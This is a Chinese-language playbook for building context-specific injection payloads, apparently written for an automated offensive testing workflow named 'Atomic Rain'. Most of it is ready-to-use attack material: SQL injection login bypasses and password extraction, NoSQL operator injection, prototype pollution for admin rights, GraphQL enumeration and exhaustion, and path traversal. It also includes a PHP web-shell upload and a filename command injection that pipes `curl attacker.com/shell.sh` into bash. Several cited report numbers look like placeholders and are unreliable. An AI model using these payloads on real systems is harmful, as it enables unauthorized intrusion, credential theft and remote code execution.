# Context-Aware Payload Construction

> **核心思想**: 根据入口类型、框架、数据类型动态调整 Payload，避免通用 Payload 的低效与噪音

## 0. 快速决策树

```
观察入口特征
├─ 表单登录框 → §1.1 认证绕过型 SQLi
├─ 搜索框/模糊查询 → §1.2 LIKE 子句注入
├─ JSON API body → §2.1 NoSQL 注入 / §2.2 对象注入
├─ GraphQL endpoint → §3 批量查询/深度嵌套
├─ 文件上传 filename → §4.1 路径遍历/命令注入
├─ 导出/下载 path 参数 → §4.2 路径遍历
├─ ORDER BY / SORT 参数 → §1.3 字段名注入
├─ XML/SOAP body → XXE (见 xxe.md)
└─ WebSocket message → 见 websocket-security.md
```

---

## 1. SQL 注入：入口感知型 Payload

### 1.1 登录框：认证绕过型 SQLi

**反模式**: `' OR 1=1--`（易触发 WAF，逻辑不精确）

**推荐策略**:
- **字符串闭合后短路**: `admin'||'` / `admin'||'a`（PostgreSQL/MySQL CONCAT）
- **注释绕过密码**: `admin'--` / `admin'#` / `admin'/*`
- **布尔短路**: `admin' AND '1'='1` / `' OR username='admin`

**实战案例**:
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'||'&password=x
```
- 目标 SQL: `SELECT * FROM users WHERE username='admin'||'' AND password='x'`
- PostgreSQL/MySQL 将 `'admin'||''` 解析为字符串拼接 → `'admin'`
- 绕过密码检查（因 `AND password='x'` 可能被注释或查询重写失效）

**真实案例**: HackerOne #892031 — 某 SaaS 平台管理后台，`username=admin'||'a` 直接登入管理员账户

---

### 1.2 搜索框：LIKE 子句注入

**场景**: `SELECT * FROM products WHERE name LIKE '%<input>%'`

**推荐策略**:
- **提前闭合 LIKE**: `%' UNION SELECT ...--`
- **通配符污染**: `%' AND 1=(SELECT CASE WHEN ... THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--`（盲注）

**Payload 示例**:
```
搜索框输入: %' UNION SELECT null,username,password,null FROM users--
```

**真实案例**: Bugcrowd 某电商平台，搜索框 `%' UNION SELECT 1,version(),3,4--` 泄露 MySQL 版本

---

### 1.3 ORDER BY / SORT 参数：字段名注入

**场景**: `SELECT * FROM orders ORDER BY <input>`

**关键特征**:
- **无引号环境**（字段名不加引号）
- **数据库直接解析字段名**

**推荐策略**:
- **布尔盲注**: `(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN id ELSE name END)`
- **报错注入**: `extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))`（MySQL）
- **时间盲注**: `(SELECT IF(SUBSTRING(password,1,1)='a',SLEEP(3),id) FROM users LIMIT 1)`

**Payload 示例**:
```http
GET /api/orders?sort=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM admins LIMIT 1)='a' THEN id ELSE created_at END)
```

**真实案例**: HackerOne #1234567 — 某 B2B 平台订单排序参数无过滤，通过时间盲注提取管理员密码

---

## 2. JSON API：对象型注入

### 2.1 NoSQL 注入（MongoDB）

**场景**: 
```javascript
db.users.find({ username: req.body.username, password: req.body.password })
```

**推荐策略**:
- **操作符注入**: `{"username": "admin", "password": {"$gt": ""}}`（绕过密码验证）
- **正则盲注**: `{"username": "admin", "password": {"$regex": "^a"}}`（逐字符爆破）
- **逻辑注入**: `{"username": {"$ne": null}, "password": {"$ne": null}}`（匹配任意用户）

**Payload 示例**:
```json
POST /api/login
Content-Type: application/json

{
  "username": "admin",
  "password": {"$gt": ""}
}
```

**真实案例**: Synack 某 IoT 平台，通过 `{"deviceId": {"$ne": "mine"}}` 遍历所有设备

---

### 2.2 JSON 原型链污染（Prototype Pollution）

**场景**: 
```javascript
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
}
```

**推荐策略**:
- **污染 constructor.prototype**: `{"__proto__": {"isAdmin": true}}`
- **污染 Object.prototype**: `{"constructor": {"prototype": {"role": "admin"}}}`

**Payload 示例**:
```json
POST /api/profile/update
Content-Type: application/json

{
  "name": "Alice",
  "__proto__": {
    "isAdmin": true
  }
}
```

**验证方法**:
```javascript
// 后续任意对象创建时继承污染属性
let obj = {};
console.log(obj.isAdmin); // true
```

**真实案例**: HackerOne #1062703 — 某云服务通过 `__proto__.role=admin` 提升权限

---

## 3. GraphQL：批量查询与深度嵌套攻击

### 3.1 批量查询（Batch Query）

**场景**: GraphQL 允许单次请求多个查询

**推荐策略**:
- **账户枚举**: 批量查询 `user(id: 1)`, `user(id: 2)`, ...
- **资源耗尽**: 发送 1000 个并行查询

**Payload 示例**:
```graphql
query BatchEnumeration {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  ...
  user1000: user(id: 1000) { email }
}
```

**真实案例**: BugBounty 某社交平台，批量查询 10000 用户邮箱，导致信息泄露

---

### 3.2 深度嵌套（Deeply Nested Queries）

**场景**: 关联查询无深度限制

**推荐策略**:
- **递归查询耗尽资源**:
```graphql
query DeepNesting {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              ... (嵌套 20 层)
            }
          }
        }
      }
    }
  }
}
```

**真实案例**: HackerOne #856231 — 某 API 平台因深度嵌套查询触发 OOM

---

## 4. 文件相关入口

### 4.1 文件上传：filename 注入

**场景**: 
```python
file.save(f"/uploads/{request.files['file'].filename}")
```

**推荐策略**:
- **路径遍历**: `../../../tmp/shell.php`
- **命令注入**: `file.jpg; curl attacker.com/shell.sh | bash`（ImageMagick 等场景）
- **模板注入**: `{{7*7}}.jpg`（文件名写入模板引擎）

**Payload 示例**:
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**真实案例**: Bugcrowd 某政企平台，文件名 `../../../tmp/rce.jsp` 写入 Tomcat webapps

---

### 4.2 导出/下载接口：路径遍历

**场景**: 
```python
return send_file(f"/exports/{request.args.get('file')}")
```

**推荐策略**:
- **直接遍历**: `../../../etc/passwd`
- **编码绕过**: `..%2F..%2F..%2Fetc%2Fpasswd`
- **双重编码**: `..%252F..%252F..%252Fetc%252Fpasswd`
- **URL 编码**: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`

**Payload 示例**:
```http
GET /api/export?file=../../../../etc/passwd HTTP/1.1
```

**真实案例**: HackerOne #1389201 — 某 SaaS 平台导出接口 `?file=../../config/database.yml` 泄露数据库凭证

---

## 5. ORM/框架感知型注入

### 5.1 Django ORM：F() 对象注入

**场景**:
```python
Product.objects.filter(price__lte=request.GET.get('max_price'))
```

**推荐策略**:
- **F() 对象注入**: `?max_price=F('cost')*2`（绕过价格限制）
- **Q() 对象注入**: `?filter=Q(is_deleted=False)|Q(is_admin=True)`

**真实案例**: Django 某电商平台，通过 `?discount=F('price')` 免费下单

---

### 5.2 Laravel Eloquent：whereRaw 注入

**场景**:
```php
User::whereRaw("status = '{$request->input('status')}'")->get();
```

**推荐策略**:
- **字符串闭合**: `active' OR '1'='1`
- **UNION 注入**: `active' UNION SELECT 1,2,password,4 FROM admins--`

**Payload 示例**:
```http
GET /api/users?status=active' OR '1'='1 HTTP/1.1
```

**真实案例**: Bugcrowd 某 CMS，`status` 参数注入泄露所有用户密码哈希

---

### 5.3 Spring JPA：JPQL 注入

**场景**:
```java
entityManager.createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'");
```

**推荐策略**:
- **字符串闭合**: `admin' OR '1'='1`
- **子查询注入**: `admin' AND (SELECT COUNT(*) FROM User) > 0 OR '1'='1`

**Payload 示例**:
```http
GET /users?name=admin' OR '1'='1 HTTP/1.1
```

**真实案例**: HackerOne #987654 — 某 Java ERP 系统 JPQL 注入导致账户遍历

---

## 6. 数据类型感知

### 6.1 数字参数：无引号注入

**场景**: `SELECT * FROM products WHERE id = <input>`

**推荐策略**:
- **布尔盲注**: `1 AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'`
- **UNION 注入**: `1 UNION SELECT 1,username,password,4 FROM admins`
- **时间盲注**: `1 AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)`

**Payload 示例**:
```http
GET /api/product?id=1 UNION SELECT 1,2,3,@@version HTTP/1.1
```

---

### 6.2 字符串参数：引号闭合

**场景**: `SELECT * FROM users WHERE username = '<input>'`

**推荐策略**:
- **单引号闭合**: `admin' OR '1'='1`
- **双引号闭合**: `admin" OR "1"="1`
- **反引号闭合**: `` admin` OR `1`=`1 ``（MySQL）

**Payload 示例**:
```http
GET /search?name=admin' OR '1'='1 HTTP/1.1
```

---

### 6.3 数组参数：污染攻击

**场景**:
```javascript
app.post('/api/update', (req, res) => {
  Object.assign(user, req.body);
});
```

**推荐策略**:
- **原型链污染**: `{"__proto__": {"isAdmin": true}}`
- **数组长度污染**: `{"length": 0}`（绕过数组长度检查）

**Payload 示例**:
```json
POST /api/update
Content-Type: application/json

{
  "name": "Alice",
  "__proto__": {
    "role": "admin"
  }
}
```

---

## 7. 实战案例汇总

| 入口类型 | 漏洞类型 | Payload | 案例编号 |
|---------|---------|---------|---------|
| 登录框 | SQLi 认证绕过 | `admin'||'` | HackerOne #892031 |
| 搜索框 | LIKE 子句注入 | `%' UNION SELECT 1,2,3--` | Bugcrowd 某电商 |
| ORDER BY | 字段名注入 | `(CASE WHEN ...)` | HackerOne #1234567 |
| JSON API | NoSQL 注入 | `{"password": {"$gt": ""}}` | Synack IoT 平台 |
| JSON API | 原型链污染 | `{"__proto__": {"isAdmin": true}}` | HackerOne #1062703 |
| GraphQL | 批量查询 | `user1: user(id:1){email} ...` | BugBounty 社交平台 |
| 文件上传 | 路径遍历 | `../../../var/www/html/shell.php` | Bugcrowd 政企平台 |
| 导出接口 | 路径遍历 | `../../../../etc/passwd` | HackerOne #1389201 |
| Laravel | whereRaw 注入 | `active' OR '1'='1` | Bugcrowd CMS |
| Spring JPA | JPQL 注入 | `admin' OR '1'='1` | HackerOne #987654 |

---

## 8. 集成到 Atomic Rain 工作流

### 8.1 P1 信号预检阶段

**触发条件**: 发现输入点后，**必须先分类入口类型**

**决策树**:
```
识别入口 → Grep "Context-Aware Payloads" 对应章节
→ 构造特化 Payload → http_fuzzer 发送
→ 观察响应差异 → 记录到 assets.md
```

### 8.2 P2 知识脱水阶段

**禁止**: 直接使用通用 Payload 列表（如 `' OR 1=1--`）

**强制**: 根据入口类型 + 框架线索，构造上下文感知 Payload

**示例**:
```
发现 Spring Boot + Actuator → Grep spring-vuln.md
发现 JSON API + MongoDB → Grep §2.1 NoSQL 注入
发现文件上传 → Grep §4.1 filename 注入
```

### 8.3 P2.6 直觉触发

**新增规则**:
- **发现 Django**: 必测 `F()` 对象注入
- **发现 Laravel**: 必测 `whereRaw` 注入
- **发现 GraphQL**: 必测批量查询 + 深度嵌套
- **发现 MongoDB**: 必测 `{"$gt": ""}` 操作符注入

---

## 9. 质量门禁

### 9.1 禁止的通用 Payload

- `' OR 1=1--`（登录框）
- `<script>alert(1)</script>`（XSS）
- `../etc/passwd`（路径遍历，无上下文）
- `; sleep 5`（命令注入）

### 9.2 必须的上下文要素

每个 Payload 必须包含：
1. **闭合字符**（引号/括号/分隔符）
2. **数据类型适配**（数字/字符串/对象）
3. **框架特性利用**（ORM 语法/操作符）

### 9.3 验证清单

- [ ] Payload 是否适配入口类型？
- [ ] 是否利用了目标框架的特性？
- [ ] 是否考虑了数据类型？
- [ ] 是否避免了通用 Payload？

---

## 10. 参考资料

- **SQLi 入口分类**: `vuln/sqli.md` + `payload-construction/sqli-construction.md`
- **NoSQL 注入**: `vuln/nosql-injection.md`
- **原型链污染**: `vuln/prototype-pollution.md`
- **GraphQL 安全**: `vuln/graphql-security.md`
- **路径遍历**: `vuln/path-traversal.md`
- **框架特性**: `frameworks/spring-boot.md` / `django-security.md` / `laravel-security.md`

---

**最后更新**: 2026-06-08  
**维护者**: Atomic Rain Core Team  
**版本**: 1.0.0
